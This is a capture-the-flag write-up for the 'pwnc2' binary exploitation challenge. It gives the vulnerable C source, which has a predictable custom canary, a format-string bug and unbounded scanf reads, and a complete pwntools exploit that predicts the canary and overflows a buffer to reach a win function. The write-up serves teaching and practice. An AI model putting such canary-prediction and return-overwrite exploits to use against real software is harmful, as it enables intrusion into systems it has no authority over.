---
description: Binary Exploitation
---

# pwnc2

> A vulnerable program could you lead to the flag.
>
> By: @4nimanegra

{% file src="../../.gitbook/assets/pwn (1)" %}

{% file src="../../.gitbook/assets/pwn (1).c" %}

```
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

This challenge uses a custom canary with a predictable RNG seed, as shown below:

```c
void main(){

	setbuf(stdout,0);

	mastercanary=random();

	pwnme();

}

void pwnme(){

	int canary=mastercanary;
	char name[32];
	char surname[32];

	printf("Insert your name: ");

	scanf("%s",name);

	printf("Welcome home ");
	printf(name);
	printf("\n");

	printf("Insert your surname: ");

	scanf("%s",surname);

	srand(mastercanary);

	if(canary != rand()){

		exit(0);

	}

}
```

The master canary gets one random call, and then the seed is set up as the master canary, and one more random call is used for the final canary. Using the same variable overwrite from pwnc1 I was able to make a script to automatically calculate the canary and overwrite the variable with the correct canary, then be able to return to the win function.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# -*- template: winterbitia -*-

# ====================
# -- PWNTOOLS SETUP --
# ====================

from pwn import *
from ctypes import CDLL

exe = context.binary = ELF(args.EXE or 'pwn')
trm = context.terminal = ['tmux', 'splitw', '-h']

host = args.HOST or '130.206.158.146'
port = int(args.PORT or 42012)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *pwnme+176
continue
'''.format(**locals())

# =======================
# -- EXPLOIT GOES HERE --
# =======================

io = start()

libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
mastercanary = libc.random()
log.info(f'Master canary: {mastercanary}')
libc.srand(mastercanary)
canary = libc.rand()
log.info(f'Canary: {canary}')
log.info(f'Canary in hex: {hex(canary)}')

log.info(io.clean())
io.sendline(b'winter')
log.info(io.clean())
payload = flat(
    76 * b'A',
    canary,
    4 * b'B',
    0x000000000040114f, # ret
    0x00000000004011d6, # win
)

io.sendline(payload)
log.info(io.clean())

io.interactive()
```

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
